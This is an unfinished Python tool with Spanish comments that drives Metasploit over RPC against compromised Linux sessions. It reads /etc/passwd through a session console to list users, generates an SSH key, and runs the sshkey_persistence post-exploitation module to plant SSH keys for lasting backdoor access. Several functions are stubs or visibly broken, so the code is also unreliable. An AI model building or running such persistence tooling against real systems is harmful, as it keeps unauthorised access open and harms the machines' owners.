# TODO: funciones
#   - get_modules()
#   - get_sessions()
#   - set_options()
#   - create_session() Se crea como salida de la ejecucion de modulos que generen meterpreter
#   - remove_session()
#   - _

# from db import *
from pymetasploit3.msfrpc import *
import paramiko
import os


class Msf:

    def __init__(self) -> None:
        # self.client = MsfRpcClient('backindoor', port=55553, ssl=True)
        self.client = MsfRpcClient('backindoor', port=55553, ssl=False)
        self.console_list = []
    

    def msf_ssh_key(self):
        # try:
        if self.client.sessions.list:
            module = self.client.modules.use('post', 'linux/manage/sshkey_persistence')
            print(module.description)
            print()
            in1 = input('MSF Session [1] -> ')

            console = self.create_console()
            console.write('cut -d: -f1 /etc/passwd')
            print(console.read())
            # TODO: GUARDAR LISTA DE USUARIOS CON LA RESPUESTA DE LA CONSOLA

            
            in2 = input('Username [all] -> ')
            in3 = input('Public key [all] -> ')
            # TODO: CREAR CLAVE SSH EN CASO DE QUE NO SE HAYA SELECCIONADO NINGUNA
            if in3 == '':
                self.ssh_key_gen()
            in4 = input('SSHD config [default] -> ')
            in5 = input('Create SSHD folder [no] -> ')
            print()
            if in1 != '':
                module['SESSION'] = int(in1)
            else: module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
            if in2 != '':
                module['USERNAME'] = in2
            if in3 != '':
                module['PUBKEY'] = in3
            if in4 != '':
                module['SSHD_CONFIG'] = in4
            if in5 != '':
                module['CREATESSHFOLDER'] = in5

            console_id = self.client.consoles.console().cid
            console = self.client.consoles.console(console_id)
            print(console.run_module_with_output(module))
            console.destroy()
            return module['SESSION']

        else:
            print('-- ERROR: Requiere al menos una sesion MSF activa')
            return False
            
        # except:
        #     print('-- ERROR: No hay servidor RPC activo')


# TODO: COMRPOBRAR FUNCIONAMIENTO GET_CONSOLE(), CREATE_CONSOLE(), SSH_KEY_GEN()

    def ssh_key_gen(self):
        # Guardar directorio HOME del usuario
        home_dir = os.environ['HOME']
        # Generar una nueva clave SSH
        private_key = paramiko.RSAKey.generate(2048)
        # Guardar la clave privada en un archivo
        private_key.write_private_key_file(home_dir + '/.ssh/bid0_key')

        # Guardar la clave pública en un archivo
        with open(home_dir + '/.ssh/bid0_key.pub', 'w') as file:
            file.write(f'{private_key.get_name()} {private_key.get_base64()}')

        print('Clave SSH generada exitosamente.')

    def create_console(self):
        self.console_list.append(self.client.consoles.console().cid)
        return self.console_list[-1]
    
    def get_console(self, id_console):
        # Si no hay ninguna consola creada, se crea una nueva
        if len(self.console_list) == 0:
            return self.create_console()
        # Si hay consola creada y existe el parametro id_console, se busca y si no se encuetra, devuelve None
        elif id_console:
            for console in self.console_list:
                if id_console == console.id:
                    return console
            return None
        # Si no recibe el parametro id_console, devuelve la lista de consolas
        else:
            return self.console_list
            



    def get_modules(self):
        return self.client.modules.post
        

    def select_module(self, name):
        return self.client.modules.use('post', name)
    

    def get_missing_required(self, module):
        return module.missing_required


    def config_module():
        pass

    def get_sessions(self):
        if self.client.sessions.list:
            return self.client.sessions.list
        else:
            return None
        
    def get_session(self, id):
        if len(self.client.sessions.list) > 1:
            return self.client.sessions.list[id]
        else:
            return None

    def create_session():
        pass

    def remove_session():
        pass



def get_modules(client, type):
    if type == 'post':
        client.modules.post
    elif type == 'multi':
        client.modules.multi
    elif type == 'auxiliary':
        client.modules.auxiliary
    elif type == 'payloads':
        client.modules.payloads
    elif type == 'nops':
        client.modules.nops
    elif type == 'encodeformats':
        client.modules.encodeformats
    elif type == 'encoders':
        client.modules.encoders
    elif type == 'evasion':
        client.modules.evasion
    elif type == 'platforms':
        client.modules.evasion





